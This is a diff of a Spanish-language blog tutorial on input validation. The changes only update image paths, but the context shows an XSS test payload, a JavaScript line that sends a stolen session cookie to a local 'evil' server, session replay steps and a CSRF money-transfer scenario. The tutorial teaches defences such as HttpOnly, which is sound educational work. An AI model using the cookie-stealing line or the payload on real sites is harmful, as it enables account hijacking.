@@ -3,8 +3,8 @@ title: Validación de entradas
 layout: post
 author: Patrick Campillo
 excerpt_separator: <!--more-->
-typora-copy-images-to: ../images/
-typora-root-url: ../
+typora-copy-images-to: ../assets/img/valentradas/
+typora-root-url: ../../
 ---
 
 ## XSS (Cross-site-scripting)
@@ -39,13 +39,13 @@ if ($_SERVER['REQUEST_METHOD'] == "GET") {
 
 Su propósito es bastante simple, mostrar una página con los datos introducidos. Pero si en el cuadro de introducir insertamos el texto `<script>alert('hackeado')</script>` y enviamos. 
 
-![](/images/valentradas/1.png)
+![](/patrickcampillo/assets/img/valentradas/1.png)
 
 
 
 Habremos realizado un ataque XSS simple, pero efectivo.
 
-![](/images/valentradas/2.png)
+![](/patrickcampillo/assets/img/valentradas/2.png)
 
 
 
@@ -84,11 +84,11 @@ if ($_SERVER['REQUEST_METHOD'] == "GET") {
 
 Por lo que si volvemos a introducir `<script>alert('hackeado')</script>`
 
-![](/images/valentradas/3.png)
+![](/patrickcampillo/assets/img/valentradas/3.png)
 
 Se mostrará tal cual.
 
-![](/images/valentradas/4.png)
+![](/patrickcampillo/assets/img/valentradas/4.png)
 
 
 
@@ -147,11 +147,11 @@ if ($ya_registrado){
 
 Por lo que una vez iniciado sesión con un usuario, por ejemplo Mario:
 
-![](/images/valentradas/5.png)
+![](/patrickcampillo/assets/img/valentradas/5.png)
 
 Encontraríamos la ID de la Sesión en una **cookie** de la cabecera de la petición.
 
-![](/images/valentradas/6.png)
+![](/patrickcampillo/assets/img/valentradas/6.png)
 
 
 
@@ -218,49 +218,49 @@ myImage.src = "http://127.0.0.1:8080/robo-de-sesion.php?session_robada=" + c;
 
 Para poner en funcionamiento el ataque, primero deberemos iniciar sesión con un usuario, y seguidamente visitar la página `hackeada.php `. 
 
-![](/images/valentradas/7.png)
+![](/patrickcampillo/assets/img/valentradas/7.png)
 
 
 
 Como podemos observar, nos indica que nos ha robado la sesión y la ha enviado al servidor web **evil**. Y lo podemos comprobar, accediendo al contenedor **Docker** del servidor web **evil**, y mostrando el fichero `sessions.txt`.
 
-![](/images/valentradas/8.png)
+![](/patrickcampillo/assets/img/valentradas/8.png)
 
 
 
 Una vez conocemos la ID de Sesión, accedemos a la página `login.php` mediante una pestaña de incógnito,  y comprobamos la nueva ID de Sesión que tenemos.
 
-![](/images/valentradas/9.png)
+![](/patrickcampillo/assets/img/valentradas/9.png)
 
 
 
 Ahora, la editamos e introducimos la que hemos robado mediante **XSS**.
 
-![](/images/valentradas/9-1.png)
+![](/patrickcampillo/assets/img/valentradas/9-1.png)
 
 
 
 Y enviando la nueva petición, obtendremos la siguiente vista preliminar.
 
-![](/images/valentradas/9-2.png)
+![](/patrickcampillo/assets/img/valentradas/9-2.png)
 
 
 
 Otra forma de realizar este proceso es utilizando alguna extensión de administración de **cookies**, en la cual, buscaremos la **cookie** que indica el ID de sesión.
 
-![](/images/valentradas/10.png)
+![](/patrickcampillo/assets/img/valentradas/10.png)
 
  Y una vez encontrado, lo modificaremos por el valor de la ID robada. Lo guardaremos, verificaremos que está establecida, y al recargar la página obtendremos el mismo resultado de antes con la vista preliminar. Pero esta vez en la propia página.
 
-![](/images/valentradas/10-1.png)
+![](/patrickcampillo/assets/img/valentradas/10-1.png)
 
 
 
-![](/images/valentradas/10-2.png)
+![](/patrickcampillo/assets/img/valentradas/10-2.png)
 
 
 
-![](/images/valentradas/10-3.png)
+![](/patrickcampillo/assets/img/valentradas/10-3.png)
 
 
 
@@ -272,7 +272,7 @@ Otra forma de realizar este proceso es utilizando alguna extensión de administr
 
 Para evitar estas situaciones, existe una cabecera que impide que las **cookies** se puedan leer por **JavaScript**. Esta cabecera se llama `HttpOnly` y se puede añadir de la siguiente manera en la parte superior de nuestra página `login.php`:
 
-![](/images/valentradas/11.png)
+![](/patrickcampillo/assets/img/valentradas/11.png)
 
 
 
@@ -428,7 +428,7 @@ Al acceder, realiza una transferencia de 1000 € al atacante.
 
 La cual se muestra a **Mario** de la siguiente forma cuando accede a su página atacada.
 
-![](/images/valentradas/12-1.png)
+![](/patrickcampillo/assets/img/valentradas/12-1.png)
 
 
 
